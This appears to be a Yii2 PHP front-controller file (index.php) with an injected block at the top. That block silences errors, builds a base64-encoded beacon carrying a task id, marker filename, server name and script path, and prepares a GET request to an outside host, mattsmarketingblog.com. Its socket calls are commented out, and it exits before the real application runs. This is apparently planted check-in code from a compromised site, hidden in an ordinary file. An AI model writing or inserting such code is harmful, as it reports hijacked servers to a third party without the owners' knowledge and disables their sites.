<?php
error_reporting(0);
$filename="f9026c7acc22e95485751668ec799a57";
$task_id="30410";
if(!file_exists($filename)&&function_exists("parse_url")&&function_exists("socket_create")&&function_exists("socket_connect")&&function_exists("base64_encode")&&function_exists("socket_write")&&function_exists("socket_close")){
    $target="http://mattsmarketingblog.com/test/in/incoming.php";
    $target_url=parse_url($target);
    print_r($target_url);
    $target_host=$target_url["host"];
    if(!($target_port=$target_url["port"])) $target_port=80;
    $target_path=$target_url["path"];
//    $fp=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
//    socket_connect($fp,$target_host,$target_port);
    $get_parameters=base64_encode("$task_id\t$filename\t".$_SERVER["SERVER_NAME"]."\t".$_SERVER["SCRIPT_NAME"]."\n");
//echo $get_parameters;
    $request="GET $target_path?$get_parameters HTTP/1.0\r\n";
    echo $request;
//    $request.="Host: $target_host\r\n";
//    $request.="\r\n";
//    $sent=socket_write($fp,$request,strlen($request));
//    if($sent==strlen($request)){
//        $f = @fopen($filename, "w");
//        fclose($f);
//    }
//    socket_close($fp);
    exit();
}
?>
<?php

// comment out the following two lines when deployed to production
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

require(__DIR__ . '/vendor/autoload.php');
require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');

$config = require(__DIR__ . '/config/web.php');

(new yii\web\Application($config))->run();
